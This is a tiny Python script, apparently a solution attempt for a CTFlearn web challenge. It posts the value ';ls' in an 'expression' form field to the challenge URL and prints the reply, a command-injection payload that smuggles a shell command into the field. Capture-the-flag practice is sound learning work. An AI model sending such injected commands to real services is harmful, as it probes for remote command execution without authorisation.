import requests

url = 'https://web.ctflearn.com/web7/'

data = {
	'expression': ";ls"
}

r = requests.post(url,data=data)
print(r.text)